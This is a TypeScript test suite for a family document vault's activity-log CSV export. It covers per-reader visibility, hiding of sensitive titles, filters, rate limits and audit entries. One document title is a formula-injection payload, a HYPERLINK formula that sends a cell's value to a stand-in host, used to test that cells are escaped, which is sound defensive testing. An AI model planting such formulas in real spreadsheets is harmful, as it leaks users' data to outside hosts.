import { randomUUID } from 'node:crypto';
import { appendAudit, createPool, withSystem } from '@fdv/db';
import { testAdminUrl } from '@fdv/db/testing';
import {
  ACTIVITY_CSV_BOM,
  ACTIVITY_CSV_COLUMNS,
  activityCsvCapped,
  SENSITIVE_IN_WORDS,
  type ActivityCsvLine,
  type ActivityLine,
  type DocumentView,
} from '@fdv/shared';
import FormData from 'form-data';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import type { Principal, Tokens } from '../auth/service.js';
import { createHarness, type Harness } from '../test-harness.js';
import { activityCsv, type ExportSource } from './csv.js';
import { AuditService } from './service.js';

const PDF = Buffer.from('%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\n%%EOF\n');

/** A CSV as RFC 4180 reads it: rows of cells, the byte-order mark taken off. */
function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let quoted = false;
  const body = text.startsWith(ACTIVITY_CSV_BOM) ? text.slice(1) : text;
  for (let i = 0; i < body.length; i++) {
    const c = body[i] as string;
    if (quoted) {
      if (c === '"' && body[i + 1] === '"') {
        cell += '"';
        i++;
      } else if (c === '"') quoted = false;
      else cell += c;
    } else if (c === '"') quoted = true;
    else if (c === ',') {
      row.push(cell);
      cell = '';
    } else if (c === '\r' && body[i + 1] === '\n') {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = '';
      i++;
    } else cell += c;
  }
  if (cell || row.length) rows.push([...row, cell]);
  return rows;
}

const col = (name: (typeof ACTIVITY_CSV_COLUMNS)[number]) => ACTIVITY_CSV_COLUMNS.indexOf(name);

/**
 * The activity log as a spreadsheet (0.9.0-dev.82): the lines the
 * Activity page's filters keep, as the log shows them to the caller — and,
 * as ever with the log, mostly about what is *not* in somebody's copy.
 */
describe.skipIf(!testAdminUrl())('the activity log as CSV', () => {
  let h: Harness;
  let owner: Tokens;
  let sam: Tokens;
  let teen: Tokens;
  let viewer: Tokens;
  let bill: string;
  let mine: string;
  let grown: string;
  let loud: string;
  let evil: string;
  let elsewhere: string;
  const EVIL = '=HYPERLINK("https://example.test/?"&A1)';

  // Each its own address: the route allows ten a minute from one.
  let nth = 0;
  const peer = () => ({ remoteAddress: `10.82.${Math.floor(++nth / 200) % 250}.${nth % 200}` });

  const exported = async (as: Tokens, query = '') => {
    const res = await h.app.inject({
      url: `/api/v1/audit/export${query ? `?${query}` : ''}`,
      headers: h.as(as),
      ...peer(),
    });
    return res;
  };
  const rowsOf = async (as: Tokens, query = '') => {
    const res = await exported(as, query);
    expect(res.statusCode, res.body).toBe(200);
    const [head, ...rows] = parseCsv(res.body);
    expect(head).toEqual([...ACTIVITY_CSV_COLUMNS]);
    return rows;
  };
  const texts = async (as: Tokens, query = '') =>
    (await rowsOf(as, query)).map((r) => r[col('What happened')] as string);

  const make = async (body: Record<string, unknown>, as: Tokens = owner) => {
    const created = await h.app.inject({
      method: 'POST',
      url: '/api/v1/documents',
      headers: h.as(as),
      payload: { type_key: 'utility_bill', owner_member_id: owner.member_id, ...body },
    });
    expect(created.statusCode, created.body).toBe(201);
    const id = created.json<DocumentView>().id;
    const form = new FormData();
    form.append('file', PDF, { filename: 'scan.pdf', contentType: 'application/pdf' });
    await h.app.inject({
      method: 'POST',
      url: `/api/v1/documents/${id}/versions`,
      headers: { ...h.as(as), ...form.getHeaders(), 'idempotency-key': randomUUID() },
      payload: form.getBuffer(),
    });
    return id;
  };
  const visibility = async (id: string, to: string) => {
    const r = await h.app.inject({
      method: 'POST',
      url: `/api/v1/documents/${id}/visibility`,
      headers: h.as(owner),
      payload: { visibility: to },
    });
    expect(r.statusCode, r.body).toBe(200);
  };
  const download = async (id: string, as: Tokens) => {
    const version = (
      await h.app.inject({ url: `/api/v1/documents/${id}/versions`, headers: h.as(owner) })
    ).json<{ items: Array<{ id: string }> }>().items[0] as { id: string };
    await h.app.inject({ url: `/api/v1/versions/${version.id}/content`, headers: h.as(as) });
  };
  const exportsWritten = async () =>
    withSystem(h.db, owner.household_id, (trx) =>
      trx
        .selectFrom('audit_event')
        .select(['detail', 'object_type', 'object_id', 'actor_account_id'])
        .where('action', '=', 'audit.exported')
        .orderBy('id')
        .execute(),
    );

  beforeAll(async () => {
    h = await createHarness();
    owner = await h.setup();
    sam = await h.join(owner, { name: 'Sam', email: 'sam-csv@example.test', role: 'adult' });
    teen = await h.join(owner, { name: 'Aisha', email: 'aisha-csv@example.test', role: 'teen' });
    viewer = await h.join(owner, {
      name: 'Accountant',
      email: 'acc-csv@example.test',
      role: 'viewer',
    });
    bill = await make({ title: 'Water bill' });
    mine = await make({ title: 'Therapy notes' });
    await visibility(mine, 'private');
    grown = await make({ title: 'Solicitor’s letter' });
    await visibility(grown, 'adults');
    loud = await make({ title: 'Clinic letter', sensitive: true });
    evil = await make({ title: EVIL });
    await download(bill, sam);
    // A link opened by its recipient: nobody of the family did it.
    await withSystem(h.db, owner.household_id, (trx) =>
      appendAudit(trx, {
        householdId: owner.household_id,
        actorLabel: 'shared link (the letting agent)',
        action: 'share.opened',
        objectType: 'document',
        objectId: bill,
        detail: {},
      }),
    );

    // Another household, made in the database, with a line of its own.
    const other = randomUUID();
    const admin = createPool(h.adminUrl, 1);
    try {
      await admin.query("insert into household (id, name) values ($1, 'Elsewhere')", [other]);
      elsewhere = (
        await admin.query<{ id: string }>(
          `insert into document (household_id, title, type_key, visibility)
           values ($1, 'Neighbours’ deeds', 'other', 'household') returning id`,
          [other],
        )
      ).rows[0]?.id as string;
    } finally {
      await admin.end();
    }
    await withSystem(h.db, other, async (trx) => {
      await appendAudit(trx, {
        householdId: other,
        action: 'document.created',
        objectType: 'document',
        objectId: elsewhere,
      });
    });
  }, 120_000);
  afterAll(() => h.close());

  it('says it can', async () => {
    const caps = (await h.app.inject({ url: '/api/v1/capabilities' })).json<{
      features: { activity_export?: boolean };
    }>();
    expect(caps.features.activity_export).toBe(true);
  });

  it('is a spreadsheet: UTF-8 with a byte-order mark, named for the vault and the day, never cached', async () => {
    const res = await exported(owner);
    expect(res.statusCode).toBe(200);
    expect(res.headers['content-type']).toBe('text/csv; charset=utf-8');
    expect(res.headers['content-disposition']).toMatch(
      /^attachment; filename\*=UTF-8''activity-vault-\d{4}-\d{2}-\d{2}\.csv$/,
    );
    expect(res.headers['cache-control']).toBe('private, no-store');
    expect([...res.rawPayload.subarray(0, 3)]).toEqual([0xef, 0xbb, 0xbf]);
    expect(res.body).toContain('\r\n');
  });

  it('holds the lines the page shows, in its words and order, and who did each by name', async () => {
    const page = (
      await h.app.inject({ url: '/api/v1/audit?limit=100', headers: h.as(owner) })
    ).json<{ items: ActivityLine[]; next: number | null }>();
    expect(page.next).toBeNull();
    const rows = await rowsOf(owner);
    expect(rows.map((r) => r[col('What happened')])).toEqual(page.items.map((l) => l.text));
    const row = rows.find((r) => r[col('What happened')] === 'Sam downloaded “Water bill”');
    expect(row?.[col('Who')]).toBe('Sam');
    expect(row?.[col('Kind')]).toBe('Opened and downloaded');
    expect(row?.[col('Document')]).toBe('Water bill');
    expect(row?.[col('When (UTC)')]).toMatch(/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z$/);
    expect(row?.[col('When')]).toMatch(/^\d{1,2} \w{3} \d{4}, \d{1,2}:\d{2}(am|pm)$/);
    expect(row?.[col('Time zone')]).toBeTruthy();
    // The person each line names, by their name in the family.
    const setUp = rows.find((r) => r[col('What happened')] === 'Owner set up the vault');
    expect(setUp?.[col('Who')]).toBe('Owner');
  });

  it('gives each reader only what their own copy of the log shows', async () => {
    const owners = (await texts(owner)).join('\n');
    expect(owners).toContain('Therapy notes');
    expect(owners).toContain('Solicitor’s letter');

    // An Only me document is its person's alone: not even "a document".
    const sams = (await texts(sam)).join('\n');
    expect(sams).not.toContain('Therapy notes');
    expect(sams).toContain('Solicitor’s letter');
    // Adults only, kept from a teen.
    const teens = (await texts(teen)).join('\n');
    expect(teens).not.toContain('Therapy notes');
    expect(teens).not.toContain('Solicitor');
    expect(teens).toContain('Water bill');
    // Nor in any other column.
    for (const as of [sam, teen]) {
      const all = (await exported(as)).body;
      expect(all).not.toContain('Therapy notes');
    }
  });

  it('never names a Sensitive document, in its words or the Document column', async () => {
    for (const as of [owner, sam, teen]) {
      const res = await exported(as);
      expect(res.body).not.toContain('Clinic letter');
      const rows = parseCsv(res.body).slice(1);
      const about = rows.filter((r) => r[col('Document')] === SENSITIVE_IN_WORDS);
      expect(about.length).toBeGreaterThan(0);
      expect(about.every((r) => (r[col('What happened')] as string).includes('sensitive'))).toBe(
        true,
      );
      // Its own lines alone: each says it the same way.
      const own = parseCsv((await exported(as, `document=${loud}`)).body).slice(1);
      expect(own.length).toBeGreaterThan(0);
      expect(own.every((r) => r[col('Document')] === SENSITIVE_IN_WORDS)).toBe(true);
    }
  });

  it('is refused to a viewer, who reads no log, and to nobody signed in', async () => {
    const res = await exported(viewer);
    expect(res.statusCode).toBe(403);
    expect(res.json<{ error: { code: string } }>().error.code).toBe('forbidden');
    expect(res.body).not.toContain('Water bill');
    const nobody = await h.app.inject({ url: '/api/v1/audit/export', ...peer() });
    expect(nobody.statusCode).toBe(401);
  });

  it('keeps nothing of another household: not its lines, not its document', async () => {
    const all = (await exported(owner)).body;
    expect(all).not.toContain('Neighbours’ deeds');
    const theirs = await exported(owner, `document=${elsewhere}`);
    expect(theirs.statusCode).toBe(404);
    expect(theirs.body).not.toContain('Neighbours');
  });

  it('keeps the lines the filters keep: what sort, who, which days', async () => {
    const opened = await rowsOf(owner, 'kind=opened');
    expect(opened.length).toBeGreaterThan(0);
    expect(opened.every((r) => r[col('Kind')] === 'Opened and downloaded')).toBe(true);

    const bySam = await rowsOf(owner, `who=${sam.member_id}`);
    expect(bySam.length).toBeGreaterThan(0);
    expect(bySam.every((r) => r[col('Who')] === 'Sam')).toBe(true);
    expect(bySam.map((r) => r[col('What happened')])).toContain('Sam downloaded “Water bill”');

    // Anybody else: nobody of the family the reader is given.
    const others = await rowsOf(owner, 'who=else');
    expect(others.length).toBeGreaterThan(0);
    expect(others.every((r) => r[col('Who')] === '')).toBe(true);
    expect(others.map((r) => r[col('What happened')])).toContain(
      'Shared link (the letting agent) opened “Water bill”',
    );
    // A sort the database is asked for (none of its lines fold), as the page keeps it.
    const signIns = await rowsOf(owner, 'kind=sign_in');
    expect(signIns.length).toBeGreaterThan(0);
    expect(signIns.every((r) => r[col('Kind')] === 'Signing in')).toBe(true);
    const page = (await h.app.inject({ url: '/api/v1/audit?limit=100', headers: h.as(owner) }))
      .json<{ items: ActivityLine[] }>()
      .items.filter((l) => l.kind === 'sign_in')
      .map((l) => l.text);
    expect(signIns.map((r) => r[col('What happened')])).toEqual(page);

    // Every day there is: every line — and, asked again, the first export's own.
    const between = await rowsOf(owner, 'from=2000-01-01&to=2999-12-31');
    expect((await rowsOf(owner)).length).toBe(between.length + 1);
    expect(await rowsOf(owner, 'from=2999-01-01')).toEqual([]);
    expect(await rowsOf(owner, 'to=2000-01-01')).toEqual([]);
  });

  it('keeps one document’s lines, as its own activity does, and none of one the reader cannot see', async () => {
    const page = (
      await h.app.inject({ url: `/api/v1/documents/${bill}/activity`, headers: h.as(sam) })
    ).json<{ items: ActivityLine[] }>();
    const rows = await rowsOf(sam, `document=${bill}`);
    expect(rows.map((r) => r[col('What happened')])).toEqual(page.items.map((l) => l.text));
    expect(rows.every((r) => r[col('Document')] === 'Water bill')).toBe(true);
    // Another's Only me document is not there for Sam, as its page says.
    const hidden = await exported(sam, `document=${mine}`);
    expect(hidden.statusCode).toBe(404);
    expect(hidden.body).not.toContain('Therapy');
  });

  it('refuses a filter that is not one', async () => {
    for (const q of [
      'kind=everything',
      'who=sam',
      'from=2026-02-30',
      'from=21-11-2026',
      // Days the database could not take: never a failure part-way.
      'from=0000-01-01',
      'to=1899-12-31',
      'from=0099-01-01',
      'who=else&to=10000-01-01',
      'from=2026-11-21&to=2026-11-01',
      'document=nope',
      'colour=red',
    ]) {
      const res = await exported(owner, q);
      expect(res.statusCode, q).toBe(422);
      expect(res.json<{ error: { code: string } }>().error.code).toBe('validation_failed');
    }
  });

  it('never lets a cell be a formula', async () => {
    const rows = await rowsOf(owner, `document=${evil}`);
    expect(rows.length).toBeGreaterThan(0);
    expect(rows.every((r) => r[col('Document')] === `'${EVIL}`)).toBe(true);
    const res = await exported(owner, `document=${evil}`);
    expect(res.body).not.toMatch(/(^|,)=HYPERLINK/m);
  });

  it('is written in the log once an export, with its filters and how many lines, never their words', async () => {
    const before = await exportsWritten();
    const rows = await rowsOf(owner, `kind=opened&who=${sam.member_id}&from=2000-01-01`);
    const after = await exportsWritten();
    expect(after.length).toBe(before.length + 1);
    const written = after.at(-1);
    expect(written?.object_type).toBeNull();
    expect(written?.detail).toEqual({
      format: 'csv',
      who: sam.member_id,
      kind: 'opened',
      from: '2000-01-01',
      lines: rows.length,
      capped: false,
      finished: true,
    });
    expect(JSON.stringify(written?.detail)).not.toContain('Water bill');
    // And the log says it, to whoever reads it.
    const lines = (await h.app.inject({ url: '/api/v1/audit', headers: h.as(teen) })).json<{
      items: ActivityLine[];
    }>().items;
    expect(lines.map((l) => l.text)).toContain(
      'Owner downloaded the activity log as a spreadsheet',
    );

    // One document's: that document's line, for whoever may see it.
    await rowsOf(owner, `document=${mine}`);
    const last = (await exportsWritten()).at(-1);
    expect(last).toMatchObject({ object_type: 'document', object_id: mine });
    const ownerSees = (await h.app.inject({ url: '/api/v1/audit', headers: h.as(owner) }))
      .json<{ items: ActivityLine[] }>()
      .items.map((l) => l.text);
    expect(ownerSees).toContain(
      'Owner downloaded the activity of “Therapy notes” as a spreadsheet',
    );
    const samSees = (await h.app.inject({ url: '/api/v1/audit', headers: h.as(sam) }))
      .json<{ items: ActivityLine[] }>()
      .items.map((l) => l.text);
    expect(samSees.join('\n')).not.toContain('Therapy notes');
    expect(samSees).not.toContain('Owner downloaded the activity of a document as a spreadsheet');
  });

  /** Somebody as the API's routes see them, by their own session, for a test that calls the service. */
  const principalOf = async (t: Tokens): Promise<Principal> => {
    const account = await withSystem(h.db, t.household_id, (trx) =>
      trx
        .selectFrom('account_household')
        .select('account_id')
        .where('member_id', '=', t.member_id)
        .executeTakeFirstOrThrow(),
    );
    const claims = JSON.parse(
      Buffer.from(t.access_token.split('.')[1] as string, 'base64url').toString('utf8'),
    ) as { sid: string };
    return {
      accountId: account.account_id,
      sessionId: claims.sid,
      householdId: t.household_id,
      memberId: t.member_id,
      role: t.role,
      seesAdults: t.role !== 'teen' && t.role !== 'viewer',
    };
  };
  const fileOf = async (body: AsyncIterable<unknown>) => {
    const chunks: Buffer[] = [];
    for await (const c of body) chunks.push(c as Buffer);
    return Buffer.concat(chunks).toString('utf8');
  };
  const rethrow = (e: unknown) => {
    throw e;
  };

  it('reads the log a batch at a time and says the same lines, a sitting across two batches one line', async () => {
    const p = await principalOf(owner);
    const samAt = await principalOf(sam);
    // Seven looks at the water bill by Sam, one sitting: more than a batch.
    await withSystem(h.db, owner.household_id, async (trx) => {
      for (let i = 0; i < 7; i++) {
        await appendAudit(trx, {
          householdId: owner.household_id,
          actorAccountId: samAt.accountId,
          action: 'document.viewed',
          objectType: 'document',
          objectId: bill,
          detail: { page: i + 1 },
        });
      }
    });
    const audit = new AuditService(h.db);
    const linesOf = async (ask: Record<string, string>, batch?: number) => {
      const start = await audit.exportStart(p, ask);
      const out: string[] = [];
      for await (const r of audit.exportLines(p, ask, start, batch ? { batch } : {})) {
        out.push(r.line.text);
      }
      return out;
    };
    const whole = await linesOf({});
    expect(whole.filter((t) => t === 'Sam looked at “Water bill”')).toHaveLength(1);
    for (const batch of [2, 3, 5]) expect(await linesOf({}, batch)).toEqual(whole);
    const one = await linesOf({ document: bill });
    expect(one).toContain('Sam looked at “Water bill”');
    expect(await linesOf({ document: bill }, 2)).toEqual(one);
    expect(await linesOf({ kind: 'opened' }, 3)).toEqual(await linesOf({ kind: 'opened' }));
    expect(await linesOf({ kind: 'sign_in' }, 2)).toEqual(await linesOf({ kind: 'sign_in' }));
    const bySam = await linesOf({ who: sam.member_id }, 2);
    expect(bySam).toEqual(await linesOf({ who: sam.member_id }));
    expect(bySam).toContain('Sam looked at “Water bill”');
  });

  it('stops at its cap, says so in its last row, and writes that in the log', async () => {
    const p = await principalOf(owner);
    const before = (await exportsWritten()).length;
    const { body } = await activityCsv(new AuditService(h.db), p, {}, {}, rethrow, { max: 3 });
    const text = await fileOf(body);
    expect(activityCsvCapped(text)).toBe(true);
    const rows = parseCsv(text);
    expect(rows.length).toBe(1 + 3 + 1);
    expect(rows.at(-1)?.[0]).toMatch(/^# Only the newest 3 lines are in this file/);
    // Not capped when it all fits.
    expect(activityCsvCapped((await exported(owner, 'kind=opened')).body)).toBe(false);
    const written = (await exportsWritten()).slice(before)[0];
    expect(written?.detail).toMatchObject({
      lines: 3,
      capped: true,
      capped_by: 'lines',
      finished: true,
    });
  });

  it('reads no more of the log than one file may, and says how far back it went', async () => {
    const p = await principalOf(owner);
    const audit = new AuditService(h.db);
    for (const [limits, by] of [
      [{ batch: 2, rows: 4 }, 'rows'],
      [{ batch: 2, ms: 0 }, 'time'],
    ] as const) {
      const before = (await exportsWritten()).length;
      const { body } = await activityCsv(audit, p, {}, {}, rethrow, { limits });
      const text = await fileOf(body);
      expect(activityCsvCapped(text), by).toBe(true);
      const rows = parseCsv(text);
      expect(rows.at(-1)?.[0]).toMatch(
        /^# Only the newest lines are in this file: it goes back to \d{1,2} \w{3} \d{4}, \d{1,2}:\d{2}(am|pm)\. Choose/,
      );
      // No more lines than the rows read.
      expect(rows.length - 2).toBeLessThanOrEqual(by === 'rows' ? 4 : 2);
      const written = (await exportsWritten()).slice(before)[0];
      expect(written?.detail).toMatchObject({ capped: true, capped_by: by, finished: true });
    }
  });

  it('asks again before each batch that the reader still reads the log as they did', async () => {
    const p = await principalOf(sam);
    const audit = new AuditService(h.db);
    const start = await audit.exportStart(p, {});
    const lines = audit.exportLines(p, {}, start, { batch: 2 });
    expect((await lines.next()).done).toBe(false);
    const admin = createPool(h.adminUrl, 1);
    try {
      await admin.query("update account_household set role = 'teen' where member_id = $1", [
        sam.member_id,
      ]);
      let refused: unknown = null;
      try {
        for (;;) if ((await lines.next()).done) break;
      } catch (err) {
        refused = err;
      }
      expect((refused as { code?: string } | null)?.code).toBe('forbidden');
    } finally {
      await admin.query("update account_household set role = 'adult' where member_id = $1", [
        sam.member_id,
      ]);
      await admin.end();
    }
  });

  describe('a file not taken to the end', () => {
    const line = (i: number): ActivityCsvLine => ({
      line: {
        id: i,
        at: '2026-11-21T12:00:00.000Z',
        text: `Line ${i} ${'x'.repeat(200)}`,
        notable: false,
        document_id: null,
      },
      who: null,
      document: null,
    });
    const source = (lines: () => AsyncGenerator<ActivityCsvLine>) => {
      const recorded: Array<{ lines: number; capped: unknown; finished: boolean }> = [];
      const s = {
        exportStart: async () => ({
          zone: 'UTC',
          today: '2026-11-21',
          family: new Map<string, string>(),
          windows: null,
          fromStart: null,
          toEnd: null,
        }),
        exportLines: () => lines(),
        recordExport: async (_p: unknown, _a: unknown, done: (typeof recorded)[number]) => {
          recorded.push(done);
        },
      } as unknown as ExportSource;
      return { s, recorded };
    };
    const settle = () => new Promise((r) => setTimeout(r, 100));

    it('a download left part-way is written once, unfinished', async () => {
      const { s, recorded } = source(async function* () {
        for (let i = 0; ; i++) yield line(i);
      });
      const { body } = await activityCsv(s, await principalOf(owner), {}, {}, rethrow);
      const read = body[Symbol.asyncIterator]();
      await read.next();
      await read.next();
      body.destroy();
      for (let i = 0; i < 50 && recorded.length === 0; i++) await settle();
      await settle();
      expect(recorded).toHaveLength(1);
      expect(recorded[0]).toMatchObject({ finished: false, capped: null });
      expect(recorded[0]?.lines).toBeGreaterThan(0);
    });

    it('a failure part-way ends the file, written once, unfinished', async () => {
      const { s, recorded } = source(async function* () {
        for (let i = 0; i < 3; i++) yield line(i);
        throw new Error('the database went away');
      });
      const { body } = await activityCsv(s, await principalOf(owner), {}, {}, rethrow);
      await expect(fileOf(body)).rejects.toThrow('the database went away');
      await settle();
      expect(recorded).toEqual([{ lines: 3, capped: null, finished: false }]);
    });
  });

  it('has no HEAD: a download that is a line in the log is never made to be thrown away', async () => {
    const before = (await exportsWritten()).length;
    const head = await h.app.inject({
      method: 'HEAD',
      url: '/api/v1/audit/export',
      headers: h.as(owner),
      ...peer(),
    });
    expect(head.statusCode).toBe(404);
    expect((await exportsWritten()).length).toBe(before);
  });

  it('is as tight as the other heavy routes: ten a minute from one address', async () => {
    const from = { remoteAddress: '10.82.250.1' };
    const codes: number[] = [];
    for (let i = 0; i < 11; i++) {
      codes.push(
        (
          await h.app.inject({
            url: '/api/v1/audit/export?from=2999-01-01',
            headers: h.as(owner),
            ...from,
          })
        ).statusCode,
      );
    }
    expect(codes.slice(0, 10).every((c) => c === 200)).toBe(true);
    expect(codes[10]).toBe(429);
  });

  // Last: it moves the household's clock.
  it('keeps a day by the family’s clock across a change of the clocks, and a sitting by its newest look', async () => {
    const samAt = await principalOf(sam);
    const ownerAt = await principalOf(owner);
    const admin = createPool(h.adminUrl, 1);
    const was = (
      await admin.query<{ timezone: string | null }>(
        'select timezone from household where id = $1',
        [owner.household_id],
      )
    ).rows[0]?.timezone;
    try {
      await admin.query("update household set timezone = 'America/New_York' where id = $1", [
        owner.household_id,
      ]);
      // New York's clocks went back at 2am on 1 Nov 2026: a day of 25 hours,
      // 04:00 UTC to 05:00 UTC the next day. Oldest first, so the log's
      // order is the moments' order.
      const lines: Array<[string, string, string, string | null]> = [
        // 31 Oct, 11:50pm: before the day.
        ['2026-11-01T03:50:00.000Z', 'auth.signed_in', ownerAt.accountId, null],
        // A sitting across midnight: its newest look is on 1 Nov.
        ['2026-11-01T03:55:00.000Z', 'document.viewed', samAt.accountId, bill],
        ['2026-11-01T04:03:00.000Z', 'document.viewed', samAt.accountId, bill],
        // 1 Nov, 12:10am and 11:59pm (EST): in the day.
        ['2026-11-01T04:10:00.000Z', 'auth.signed_in', ownerAt.accountId, null],
        ['2026-11-02T04:59:00.000Z', 'auth.signed_in', ownerAt.accountId, null],
        // 2 Nov, midnight: after it.
        ['2026-11-02T05:00:00.000Z', 'auth.signed_in', ownerAt.accountId, null],
      ];
      for (const [at, action, actor, doc] of lines) {
        await admin.query(
          `insert into audit_event (household_id, actor_account_id, action, object_type, object_id, at, hash)
           values ($1, $2, $3, $4, $5, $6, decode('00', 'hex'))`,
          [owner.household_id, actor, action, doc ? 'document' : null, doc, at],
        );
      }
      const day = await rowsOf(owner, 'kind=sign_in&from=2026-11-01&to=2026-11-01');
      expect(day.map((r) => r[col('When')])).toEqual([
        '1 Nov 2026, 11:59pm',
        '1 Nov 2026, 12:10am',
      ]);
      expect(day.every((r) => r[col('Time zone')] === 'America/New_York')).toBe(true);
      expect(day.map((r) => r[col('When (UTC)')])).toEqual([
        '2026-11-02T04:59:00.000Z',
        '2026-11-01T04:10:00.000Z',
      ]);
      // The sitting: one line, on the day of its newest look, as the page has it.
      const looks = (q: string) =>
        rowsOf(owner, `kind=opened&${q}`).then((rows) =>
          rows.filter((r) => r[col('When (UTC)')]?.startsWith('2026-11-0')),
        );
      const nov1 = await looks('from=2026-11-01&to=2026-11-01');
      expect(nov1.map((r) => [r[col('What happened')], r[col('When')]])).toEqual([
        ['Sam looked at “Water bill”', '1 Nov 2026, 12:03am'],
      ]);
      expect(await looks('from=2026-10-31&to=2026-10-31')).toEqual([]);
      expect(
        (await rowsOf(owner, 'kind=sign_in&from=2026-10-31&to=2026-10-31')).map(
          (r) => r[col('When')],
        ),
      ).toEqual(['31 Oct 2026, 11:50pm']);
    } finally {
      await admin.query('update household set timezone = $2 where id = $1', [
        owner.household_id,
        was ?? null,
      ]);
      await admin.end();
    }
  });
});
